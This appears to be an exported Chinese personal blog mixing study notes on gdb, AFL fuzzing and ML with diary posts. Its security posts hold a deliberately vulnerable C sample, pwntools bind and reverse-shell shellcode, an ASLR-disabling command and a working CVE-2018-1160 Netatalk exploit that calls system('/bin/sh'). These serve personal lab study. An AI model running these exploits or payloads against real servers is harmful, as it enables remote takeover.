之所以要区分硬件和软件断点，是因为软件断点要往某个地址写入断点指令的，那么最起码该地址应该是可写的吧？大多数时候，我们的程序是会被加载到内存（RAM）中执行的，RAM是可读可写，这时候软件断电就是有效的。但是，对于某些比较重要的程序，可能会直接在flash中执行，并且flash对用户可能是只读的，这时候软件断点就没有用了，因为没办法写进断点指令，此时必须依赖于硬件断点。这就是软件断点和硬件断点使用上的不同。 hb为硬件断点，使用方式与软中断相同。 内存断点：watch指令。监控变量或表达式的值。 一些常见指令https://wizardforcel.gitbooks.io/100-gdb-tips/content/show-version.html iot测信道攻击（俺只知道这个）条件竞争呃呃，只有一点了解。","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"sum","slug":"sum","permalink":"https://fuurinko.github.io/tags/sum/"}]},{"title":"再识AFL","slug":"fuzz_再识AFL","date":"2022-10-22T02:55:57.639Z","updated":"2022-10-23T11:38:37.705Z","comments":true,"path":"2022/10/22/fuzz_再识AFL/","link":"","permalink":"https://fuurinko.github.io/2022/10/22/fuzz_%E5%86%8D%E8%AF%86AFL/","excerpt":"","text":"0​ 其实大概半年前就已经搭建过环境，成功运行过AFL了，但是当时完全只是在看图说话，对这个东西没有任何系统的认识。现在趁着愉快的周末时间学习一会儿。 环境搭建​ 这里提前防止PD背刺无法使用嵌套虚拟化，选用vmware ，搭的是ubuntu20.04 lts的环境。顺带插一句，只要把“针对游戏优化”关掉就能让鼠标在虚拟机和物理机之间顺畅移动。 首先是安装一些必要软件。 12sudo apt install clangsudo apt install llvm 接着编译afl 12345wget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgztar -zxvf afl-2.52b.tgzcd afl-2.52bmakesudo make install 只按以上指令执行我印象中是会有一些依赖的问题，但是时间太过久远，也不是什么关键问题，就忽略了。 编译好是这个界面： 试用1利用afl提供的编译器编译代码（以便于插桩）。 1../afl-gcc -g -o vul1 ./vul1.c ![截屏2022-10-22 下午4.31.15](/Users/rin/Desktop/截屏2022-10-22 下午4.31.15.png) 然后我们需要建立我们的输入，以及输出文件夹。分别创建文件夹 in和out。这个1就是为这个漏洞程序构建的语料。可以看到是一连串垃圾字符。 最后 1./afl-fuzz -i ./in -o ./out ./test/vul1 一些功能&amp;参数process timing运行时长，最近找到的的路径、崩溃、挂起的时间。 overall results完成的循环数、找到的总路径数，崩溃及挂起数 cycle progress本次循环进度。 map coverage目标二进制文件中的插桩代码所观察到覆盖范围的细节。 stage progress执行的文件的变异策略、执行次数和执行速度。 Fuzzing strategy yields模糊测试策略的结果。 试用2这次还是利用上一次的代码&amp;二进制文件，我们利用afl提供给我们的默认的语料。 代码 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123; int len = strlen(str); if(str[0] == &#x27;A&#x27; &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == &#x27;F&#x27; &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf(&quot;it is good!\\n&quot;); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; 1./afl-fuzz -i ./testcases/ -o ./out ./test/vul1 跑。 我跑到这里就结束进程了。 out中多了很多文件。依次打开来看看： fuzzer_stats 就是显示了fuzz过程的一些信息。 fuzz_bitmap ？？ plot_data 还是什么相关的信息。 quene ？ crashes 这个就是需要我们认真分析的数据了，整理一下就是： 12341:��&#x27;�����*&#x27;9&#x27;&#x27;��*&#x27;���k��f�&#x27;&#x27;. &#x27;&#x27;.&#x27;9&#x27;&#x27;��*&#x27;9&#x27;&#x27;��*&#x27;&#x27;&#x27; &#x27;&#x27;P&#x27;���k��f���&#x27;&#x27;����������...���@&#x27;2:��dddj�dA@@@@3@@�Xddt��?ddddddddddddd�X���?ddddddddddddd�X����������ddd� �%������ddd� ���@@��\\���Xd�����������ddd���Wd�d��3:5%n��� //触发格式化字符串4:F====P //首字母为F，len为6 可以看到找到了两个漏洞。 maker一下这几篇文章 https://bbs.pediy.com/thread-273639.htm#msg_header_h2_5 https://myfzy.top/2021/03/04/AFL/#编译并安装AFL 参考https://cjovi.icu/fuzzing/1138.html https://cjovi.icu/fuzzing/1140.html","categories":[{"name":"FUZZ_AFL","slug":"FUZZ-AFL","permalink":"https://fuurinko.github.io/categories/FUZZ-AFL/"}],"tags":[{"name":"FUZZ","slug":"FUZZ","permalink":"https://fuurinko.github.io/tags/FUZZ/"}]},{"title":"getshell是什么？","slug":"mess_getshell是什么？","date":"2022-10-18T07:01:02.029Z","updated":"2022-10-24T12:22:16.059Z","comments":true,"path":"2022/10/18/mess_getshell是什么？/","link":"","permalink":"https://fuurinko.github.io/2022/10/18/mess_getshell%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/","excerpt":"","text":"0 前言​ 研究2018-1160的时候，看到一篇文章中的一句话，让我费解到了现在： HITCON CTF 2019 Pwn 371 Netatalk 非常不幸的是，最近在研究2016-10191的时候也遇到了同样的问题——onegadget无法getshell，以上种种让我对getshell这个看似简单的概念产生了巨大的疑惑，遂有了这一篇文章–getshell到底是什么？ 问题解答？​ 首先讲我对于“自行dup i/o”的理解，可能有不对的地方。一般情况下，我们利用pwbntools封装的socket接口与远程程序进行交互，我们的io都已经被pwntools重定向到了socket上，所以我们如果希望程序执行system(&quot;/bin/sh&quot;)的话就只需要发送过去就好了。那么当程序执行这条语句的时候，就会生成一个本地的shell，再由pwntools发送过来以完成“交互”。但是如果程序本身就是由socket进行交互的话，我们希望程序执行system(&quot;/bin/sh&quot;)，那么好的情况它也只是会在本地执行sh,而这个弹出的shell并不能进行交互，因为没有渠道供我们与这个“shell”交互。所以解决方式就是利用shellcode或rop链反弹shell。 ctf getshell​ 首先从简单的ctf pwn开始。 ​ 平时我们getshell的思路——控制程序执行流，rip劫持为提权函数。比如说覆盖某个函数指针为system(&quot;/bin/sh&quot;)，一般的流程是这样：本地打通后，连接远程环境，一般情况下也能拿到远程机器的shell。 ​ 但是我们究竟是怎么与远端程序进行通信的？ ​ 我们通常使用pwntool的tubes模块，比如 1p = remote(&quot;ip&quot;,port) ​ 这个函数其实非常好理解，但是实际上实现的功能并不简单。 ​ 看一看pwntools的官方文档的解释： 创造一个远程主机的TCVP/UDP 链接。熟悉socket编程的话就能很快反应过来，其实就是pwntool为我们创建了一个socket供本机与远程进行连接。 process()的功能也可以用同样的方式去理解。 实战如果程序通信是通过socket，那么我们无法通过简单的one_gadget或者什么弹shell，就需要用到一些方法。这里copy一下轩神的笔记： Getshell远程：真·RCE 正连？反连？不连？ 12345678from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)io = remote(&quot;127.0.0.1&quot;,8888)shellcode1 = asm(shellcraft.sh())#无交互式shellshellcode2 = asm(shellcraft.amd64.linux.bindsh(4444))#正连shellcode3 = asm(shellcraft.connect(&#x27;127.0.0.1&#x27;,4444)+shellcraft.dupsh())#反连shellcode4 = asm(shellcraft.dupsh(4))#不连shellcode5 = asm(shellcraft.findpeersh(io.lport))#不连 以上几种就是常见的弹shell思路，在cve-2016-10190和10191就是两个很好的例子，他们都是使用socket进行通信，并且都是可以利用反连到&#39;127.0.0.1&#39;+port的shellcode来弹shell。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[]},{"title":"小兔的EE破防日记","slug":"vivi_小兔学电路破防日记","date":"2022-10-15T02:23:51.273Z","updated":"2022-10-15T02:38:04.028Z","comments":true,"path":"2022/10/15/vivi_小兔学电路破防日记/","link":"","permalink":"https://fuurinko.github.io/2022/10/15/vivi_%E5%B0%8F%E5%85%94%E5%AD%A6%E7%94%B5%E8%B7%AF%E7%A0%B4%E9%98%B2%E6%97%A5%E8%AE%B0/","excerpt":"","text":"​ ​ 电子系统是一门什么课啊。 ​ 怎么会有课会把模电和数电结合在一起啊。电路分析是世界上最难的课，电子系统是比电路分析更难的课。 昨天电子系统的seminar，老师讲了多久这牢我就坐了多久。昨天讲了什么呢？ ​ 基尔霍夫定律，不会。运算放大器反馈的类型，首先需要区分不同类型的方法器，同向放大器，反向放大器，差分放大器，还有啥，然后需要判断串并联，是电压还是电流。不会。运算放大器的增益和输出电压的计算，不会。利用现有放大器设计反馈电路，不会，设计da转换，不会。 ​ 我以为数字信号处理是我今年最难的专业课，但是不是，电子系统才是。 ​ 并且讲课的老师一个比一个更会念ppt，还有的专挑数字讲，不讲原理不讲方法。今天上听力课还破防了，tpo 28set4对吧，老师都不忍心让我继续做了，连第一题都没听出来。教师资格证是吧，我真的会谢，谢谢你，因为有你。 ​ dspdspdsp谢谢你我谢谢你，电子系统我也谢谢你。谢谢你谢谢你谢谢你谢谢你谢谢你。滤波器的频域响应和时域响应，窗函数的使用，iir和fir滤波器的性质。还有啥，还有美丽甜美可爱ppt老师讲不明白的快速傅立叶变换。 ​ “要不是要给你们备课，我自己都忘了这个原理。”这是美丽尊敬的ppt老师的原话，原话哟。谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你 。","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"cve-2018-1160分析","slug":"cve-2018-1160","date":"2022-10-15T02:12:20.057Z","updated":"2022-10-15T05:43:33.779Z","comments":true,"path":"2022/10/15/cve-2018-1160/","link":"","permalink":"https://fuurinko.github.io/2022/10/15/cve-2018-1160/","excerpt":"","text":"呃呃，这是一个阉割版，但是懒得改了，原文+代码 2.5w字，真的没那么敷衍的。 环境搭建ubuntu 18.04 （libc-2.27.so） netatalk 二进制文件-》可以在pwnable上找到编译好的文件，非常方便。 4：漏洞复现关闭地址随机化。 1sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot; poc123456789101112131415161718192021222324252627282930from pwn import *context(endian=&#x27;little&#x27;)ip = &quot;127.0.0.1&quot;port = 5566libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)def gen_dsi(data): dsi = b&#x27;\\x00\\x04\\x00\\x01&#x27; dsi += p32(0) dsi += p32(len(data),endian=&#x27;big&#x27;) dsi += p32(0) dsi += data return dsidef aaw(io,addr,data): payload = b&#x27;\\x01&#x27;+ p8(0x18)+ b&#x27;a&#x27;*0x10 + p64(addr) io.send(gen_dsi(payload)) io.recv() io.send(gen_dsi(data))libc_addr = 0x7f36e0364000 rtld = 0x7f36e0a58060system = libc_addr + libc.symbols[&#x27;system&#x27;]io = remote(ip,port)cmd = b&#x27;/bin/sh;&#x27;aaw(io,rtld+2312,cmd.ljust(0x600,b&#x27;\\x00&#x27;)+p64(system))io.close() 解压natatalk.tar,进入文件夹，第一个终端启动afpd： 1LD_PRELOAD=&quot;./libatalk.so.18&quot; ./afpd -d -F ./afp.conf 可以看到进程执行中： 另开第二个终端： 123rin@rin-virtual-machine:~$ sudo netstat -pantu | grep 5566[sudo] password for rin: tcp6 0 0 :::5566 :::* LISTEN 17266/./afpd 可以看到成功运行，pid为17266，另开一个终端执行exp，可以看到进程快速断开，大约等待三分钟，可以看到afpd进程这边收到shell。 利用先溢出attn_quantum字段，注意到*commands是一个指针，用作接受DSI payload数据部分的buffer，因此我们可以通过在同一个socket中发送两次DSI消息，实现任意地址写：第一次发送的消息，覆盖commands指针为目标地址（如free_hook地址）；第二次发送的消息，触发dsi_stream_receive()函数，向目标地址中写入任意内容，长度可由dsi-&gt;header.dsi_len指定,从而实现RCE。 exp参考轩哥，yyds。","categories":[{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/categories/cve/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/tags/cve/"}]},{"title":"追忆似水年华","slug":"幻想曲-05-追忆似水年华","date":"2022-10-13T11:34:04.095Z","updated":"2022-10-24T12:34:27.049Z","comments":true,"path":"2022/10/13/幻想曲-05-追忆似水年华/","link":"","permalink":"https://fuurinko.github.io/2022/10/13/%E5%B9%BB%E6%83%B3%E6%9B%B2-05-%E8%BF%BD%E5%BF%86%E4%BC%BC%E6%B0%B4%E5%B9%B4%E5%8D%8E/","excerpt":"","text":"​ ​ 花了大半个月，我看了追忆似水年华第一部的四分之一，以睡前读十五分钟的形式。 ​ 我完全不想写什么读后感之类的东西，因此如果可以，我希望模仿普鲁斯特的文笔去记录一些事。这就是我的全部感想。 ​ 于是在我决定动笔的一瞬间，这件事就已经划上了句号。 ​ 就像从一个只装有蓝球和红球的袋子中拿出一个红球，就瞬间知道袋子里剩下的球是蓝色一样，我贫瘠的记忆中并不包含任何使我足以写出匹及普鲁斯特哪怕十分之一的文字来的成分。对自然的观察，空气中气味的捕捉，以及恐怖阅读量和对艺术的狂热喜爱，普鲁斯特的伟大是前无古人后无来者的。写下这些话前我没有查阅任何关于他的背景或者生平，单单凭着这一百多页的文字，我看到了真正的文艺。我甚至羞愧于与普鲁斯特产生的那么一丝丝的共鸣感，但这都不是什么重要的事了。 ​ 在此之前，我对于传世的外国古典文学的认知主要来源于两方面，一方面是儿童启蒙时期被迫阅读的一些“世界名著”，另一方面就是这一年来读的一些思想较为悲观的哲学书籍或者日本文学。说来也好笑，我小时候抗拒于阅读任何一本所谓的名著，不论篇幅和国籍，甚至到高中后依然深以为傲，将其写入了作文，主题是“我真的不喜欢语文”。多亏我的语文老师算是一个见识相对高远的人，不知是欣赏我这幼稚的反骨，还是觉得我的文字功力尚且过关，给了我一个相当好看的分数，让本就有着莫名其妙自豪感的我更加沾沾自喜。 ​ 我没有办法系统地评估“不喜欢读书”这件事给我带来的影响究竟是正面还是负面的。也许是正面的吧，正因为中学时代阅读量的匮乏，导致我疯狂地想要弥补，于是还愿意抽出那么一点点宝贵的时间，分给阅读这件事。 ​ 说回我对于外国名著的印象，我读过的西方名著屈指可数，有印象的更是能够直接列举。去年看了《红与黑》、卡夫卡的《变形记》《城堡》以及一些短篇、荣格的《红书》和一些莫名其妙的哲学书比如《作为意志和表象的世界》，《悲剧的诞生》以及一些奇怪的拉康选集（以上的哲学书我通通我没有看完）。日本文学相对多一些，川端康成的经典中篇我看了两部，三岛由纪夫的代表作我基本都看过，村上春树只看过《挪威的森林》，渡边淳一那种我都不打算让他算数。 ​ 为什么要列举，因为首先量确实很少，少到可以列举完全，其次， 你会发现这些书或多或少都印有时代悲伤的烙印，日本文学更甚。或是角色本身的悲剧，或是大时代历史的必然，寂寥悲伤的情绪总是挥之不去。 ​ 然而追忆带给我的只有阳光灿烂的星期日，坐在后花园读书的孤独与自由的情绪。 ​ 这种情绪带给我的是浓烈的新奇感以及吸引力，从来没有人能将干枯的日子描绘得如此多汁多味，连正午刺眼的阳光都变成了价值连城的金子。我最愿意形容将这样的文字形容为“自由的生命”，虽然也许主人公的童年是孤独的，但这样的孤独确实使我满足的。 ​ 孤独不代表悲伤，相反，孤独也是能够享受的一种情绪，在之前的日子里我已经学会了如何享受痛苦，现在我要开始学习如何享受孤独了。 ​ 「胡言乱语：谢谢慎也桑的安利。」 ​ ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"CS 329P note3","slug":"ml_CS 329P | note3","date":"2022-10-13T02:13:04.244Z","updated":"2022-10-24T12:39:49.608Z","comments":true,"path":"2022/10/13/ml_CS 329P | note3/","link":"","permalink":"https://fuurinko.github.io/2022/10/13/ml_CS%20329P%20|%20note3/","excerpt":"","text":"​ 胡言乱语part3，聚焦于线性模型算法。 为什么note2和note3隔了这么久，因为看cs 329发现完全看不懂，于是又去从头看了229，把线性模型的part看完之后反过来又去review 329，终于发现能看懂了orz。 线性模型分类 回归 分类 ps：上一个note说到主要利用决策树进行分类。 线性模型的参数&amp;方程比较重要的方程就是 预测模型的假设函数 用于拟合数据的代价函数 参数则就是假设函数中的参数，而代价函数的作用就是通过不断优化参数来使得梯度下降到达局部收敛，最后记录相关参数的值。 回归post一些笔记/// ps：多元线性回归与一元线性回归在模型中其实计算的核心思想都是利用线性的参数矩阵的转置与变量矩阵相乘，变量则可以利用复合函数的思想，将其优化为一元变量，只不多在特征缩放时需要多加注意。 分类还没看orz。 练习所有文档的链接来自https://github.com/kaieye/2022-Machine-Learning-Specialization 这里看的是2022-Machine-Learning-Specialization-main/Supervised Machine Learning Regression and Classification/week1/work 也就是监督学习的week1。 lab1？？python入门？ lab2打不开？ lab3单变量的线性回归模型。 导入包，还是matplotlib和numpy。 123import numpy as npimport matplotlib.pyplot as pltplt.style.use(&#x27;./deeplearning.mplstyle&#x27;) 要求对于一个两个样本的数据集进行线性模型的拟合。 方式是 123456# x_train is the input variable (size in 1000 square feet)# y_train is the target (price in 1000s of dollars)x_train = np.array([1.0, 2.0])y_train = np.array([300.0, 500.0])print(f&quot;x_train = &#123;x_train&#125;&quot;)print(f&quot;y_train = &#123;y_train&#125;&quot;) 我们的目的是生成价格关于房子尺寸的图表，于是x轴为面积，y轴为价格，将数据集的数据作为数组元素输入到x_train和y_train中去。 接下来介绍了获取样本数量的两种方式，一种是直接用len()函数，另一种是利用numpy的shape方法。 1234m1 = len(x_train)m2 = x_train.shape[0]#shape[0] 返回数组长度print(m1)print(m2) 回显： 12345rin@Ste1nsG4t3 work % python3 lab3.pyx_train = [1. 2.]y_train = [300. 500.]22 将数组标号。 1234for i in range(2): x_i = x_train[i] y_i = y_train[i] print(f&quot;(x^(&#123;i&#125;), y^(&#123;i&#125;)) = (&#123;x_i&#125;, &#123;y_i&#125;)&quot;) 回显： 12345rin@Ste1nsG4t3 work % python3 lab3.pyx_train = [1. 2.]y_train = [300. 500.](x^(0), y^(0)) = (1.0, 300.0)(x^(1), y^(1)) = (2.0, 500.0) 接着绘制数据。我们需要用到matplotlib包中的scatter()函数。 有点像Matlab里的操作。（喂你在胡言乱语什么，本来就是matplotlib） 设置初始变量。 12w = 100b = 100 其实就是计算这个f_wb的值，懒得打公式，截个图。 算法也非常好理解,虽然但是我还是逐行注释了。 123456789101112131415def compute_model_output(x, w, b): &quot;&quot;&quot; Computes the prediction of a linear model Args: x (ndarray (m,)): Data, m examples w,b (scalar) : model parameters Returns y (ndarray (m,)): target values &quot;&quot;&quot; m = x.shape[0]#获取样本数量 f_wb = np.zeros(m)#初始化一个m列内容为0的数组。 for i in range(m): f_wb[i] = w * x[i] + b#纯纯的计算 return f_wb #返回计算值 然后画出图 1234567891011121314151617tmp_f_wb = compute_model_output(x_train, w, b,)# Plot our model predictionplt.plot(x_train, tmp_f_wb, c=&#x27;b&#x27;,label=&#x27;Our Prediction&#x27;)# Plot the data pointsplt.scatter(x_train, y_train, marker=&#x27;x&#x27;, c=&#x27;r&#x27;,label=&#x27;Actual Values&#x27;)# Set the titleplt.title(&quot;Housing Prices&quot;)# Set the y-axis labelplt.ylabel(&#x27;Price (in 1000s of dollars)&#x27;)# Set the x-axis labelplt.xlabel(&#x27;Size (1000 sqft)&#x27;)plt.legend()plt.show() guidance非常贱地给了一句“你看，这个线不符合我们的点。” 所以challenge就是尝试不同的参数，找到适合的那一条线。 猴子都知道应该是什么，这个hint也给得很贱。 完整的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import numpy as npimport matplotlib.pyplot as pltplt.style.use(&#x27;./deeplearning.mplstyle&#x27;)# x_train is the input variable (size in 1000 square feet)# y_train is the target (price in 1000s of dollars)x_train = np.array([1.0, 2.0])y_train = np.array([300.0, 500.0])print(f&quot;x_train = &#123;x_train&#125;&quot;)print(f&quot;y_train = &#123;y_train&#125;&quot;)&#x27;&#x27;&#x27;m1 = len(x_train)m2 = x_train.shape[0]print(m1)print(m2)&#x27;&#x27;&#x27;for i in range(2): x_i = x_train[i] y_i = y_train[i] print(f&quot;(x^(&#123;i&#125;), y^(&#123;i&#125;)) = (&#123;x_i&#125;, &#123;y_i&#125;)&quot;)# Plot the data pointsplt.scatter(x_train, y_train, marker=&#x27;x&#x27;, c=&#x27;r&#x27;)# Set the titleplt.title(&quot;Housing Prices&quot;)# Set the y-axis labelplt.ylabel(&#x27;Price (in 1000s of dollars)&#x27;)# Set the x-axis labelplt.xlabel(&#x27;Size (1000 sqft)&#x27;)#plt.show()w = 200b = 100def compute_model_output(x, w, b): &quot;&quot;&quot; Computes the prediction of a linear model Args: x (ndarray (m,)): Data, m examples w,b (scalar) : model parameters Returns y (ndarray (m,)): target values &quot;&quot;&quot; m = x.shape[0]#获取样本数量 f_wb = np.zeros(m)#初始化一个m列内容为0的数组。 for i in range(m): f_wb[i] = w * x[i] + b#纯纯的计算 return f_wb #返回计算值tmp_f_wb = compute_model_output(x_train, w, b,)# Plot our model predictionplt.plot(x_train, tmp_f_wb, c=&#x27;b&#x27;,label=&#x27;Our Prediction&#x27;)# Plot the data pointsplt.scatter(x_train, y_train, marker=&#x27;x&#x27;, c=&#x27;r&#x27;,label=&#x27;Actual Values&#x27;)# Set the titleplt.title(&quot;Housing Prices&quot;)# Set the y-axis labelplt.ylabel(&#x27;Price (in 1000s of dollars)&#x27;)# Set the x-axis labelplt.xlabel(&#x27;Size (1000 sqft)&#x27;)plt.legend()plt.show() ![](https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/截屏2022-10-13 下午5.21.59.png)","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/categories/Machine-Learning/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/tags/Machine-Learning/"}]},{"title":"十月","slug":"vivi_2022年十月","date":"2022-10-01T07:07:35.450Z","updated":"2022-10-24T12:36:07.583Z","comments":true,"path":"2022/10/01/vivi_2022年十月/","link":"","permalink":"https://fuurinko.github.io/2022/10/01/vivi_2022%E5%B9%B4%E5%8D%81%E6%9C%88/","excerpt":"","text":"久违地做一些月计划 学英语。 学完cs 229p。 CVE恰米计划 好好复习可恶的专业课。 最近注意力还算集中，可以认真看之前啃不下来的题，国庆这三天先把去年bytectf的byte view和今年的httpd pwn看一下。 现在俺这个状态也不能说题海战术了，好好花时间啃难题当学习提升一下为以后挖洞做基础吧，反正也不是很想高强度打ctf了，还要抽时间把那个恐怖的python开发板作业搞完，ml学到后面也是头秃，不过现在每天背各种英语句子已经很秃了。 55，到头来最头秃的pwn反而成了放松环节 十月第二周的周计划，周末+全员核酸+本来周二就没课 制造了一个奇特的四天小长假，然而这四天的第一天已经被我挥霍了，计划一下剩余三天。 1:CVE 2:复习","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"CS 329P note2","slug":"ml_CS 329P | note 2","date":"2022-09-30T14:15:50.845Z","updated":"2022-10-24T12:39:36.632Z","comments":true,"path":"2022/09/30/ml_CS 329P | note 